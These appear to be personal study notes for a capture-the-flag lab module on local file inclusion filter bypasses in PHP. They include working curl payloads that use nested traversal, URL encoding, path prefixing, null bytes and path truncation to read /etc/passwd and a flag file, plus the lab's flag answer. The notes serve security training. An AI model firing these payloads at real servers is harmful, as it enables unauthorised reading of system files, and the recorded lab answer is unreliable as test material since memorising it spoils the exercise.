## ID
<!-- TODO: assign correct ID from your File Inclusion module range -->

## Module
File Inclusion

## Kind
notes

## Title
Section 3 — Basic Bypasses

## Description
Bypassing common LFI input filters using non-recursive traversal tricks, URL encoding, approved-path prefixing, path truncation, and null byte injection.

## Tags
lfi, file-inclusion, path-traversal, filter-bypass, php

## Commands
- curl -s 'http://<TARGET>/index.php?language=languages/....//....//....//....//flag.txt'
- curl -s 'http://<TARGET>/index.php?language=languages/..././..././..././..././flag.txt' | grep 'HTB'
- curl -s 'http://<TARGET>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'
- curl -s 'http://<TARGET>/index.php?language=./languages/../../../../etc/passwd'
- echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

## What This Section Covers
Web apps often apply filters to block LFI (stripping `../`, enforcing path prefixes, appending extensions). This section covers four main bypass families: non-recursive filter evasion, URL encoding, approved-path prefixing, and legacy PHP tricks (path truncation + null bytes). Understanding which filter is in place lets you pick the right bypass immediately.

## Methodology
1. **Identify the filter type** — test a basic `../../../../etc/passwd` payload and read the error or observe the sanitized path in the response.
2. **Non-recursive filter** (`str_replace('../', '', ...)`) — embed `../` inside itself so removal produces a valid traversal:
   - `....//` → after removal → `../`
   - `..././` → after removal → `../`
   - `....\/` or `....////` also work
3. **Character blacklist / encoding filter** — URL-encode the entire traversal string:
   - `../` → `%2e%2e%2f`; encode dots too, not just slashes
   - Double-encode if single encoding is also stripped
4. **Approved-path regex** (e.g. must start with `./languages/`) — prefix your traversal with the approved path:
   - `./languages/../../../../etc/passwd`
   - Combine with recursive bypass if both filters are active
5. **Appended extension** on modern PHP — no reliable bypass; pivot to PHP wrappers (next sections).
6. **Appended extension on PHP < 5.3** — null byte: `/etc/passwd%00` truncates `.php`.
7. **Appended extension on PHP < 5.3/5.4** — path truncation: pad string to 4096 chars so `.php` is cut off.

## Multi-step Workflow

```bash
# Non-recursive bypass — ....// variant
curl -s 'http://<TARGET>/index.php?language=languages/....//....//....//....//....//flag.txt'

# Non-recursive bypass — ..././ variant (grep for flag)
curl -s 'http://<TARGET>/index.php?language=languages/..././..././..././..././..././flag.txt' | grep 'HTB'

# URL encoding bypass
curl -s 'http://<TARGET>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'

# Approved-path prefix bypass
curl -s 'http://<TARGET>/index.php?language=./languages/../../../../etc/passwd'

# Path truncation payload generator (PHP < 5.3/5.4)
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

# Null byte bypass (PHP < 5.5)
curl -s 'http://<TARGET>/index.php?language=../../../../etc/passwd%00'
```

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Read `/flag.txt` through multiple filters | `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}` | Approved-path prefix + non-recursive bypass: `languages/..././..././..././..././..././flag.txt` |

## Key Takeaways
- `str_replace('../', '')` is trivially beaten by nesting: `....//` survives one pass and leaves `../` intact.
- Multiple filters can be stacked — always combine the approved-path prefix with your traversal bypass.
- URL encoding must encode **dots** too (`%2e`), not just slashes — many encoders skip dots by default.
- Null byte and path truncation only matter on very old PHP (< 5.3–5.5); note them for legacy targets.
- If you're not sure how many `../` are needed, use 5–6; going above root is harmless.

## Gotchas
- Don't use plain `....//` without the approved-path prefix when a regex check is also active — you'll hit "Illegal path specified" before the traversal filter even runs.
- Double URL encoding (`%252e%252e%252f`) may be needed if the server decodes once before the filter runs.
- Path truncation requires the padded string to be *exactly* long enough to cut `.php` but not your target filename — use the generator command above and verify length.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-inclusion]]  
← [[02-lfi-basics]] | [[04-php-filters]] →
<!-- AUTO-LINKS-END -->
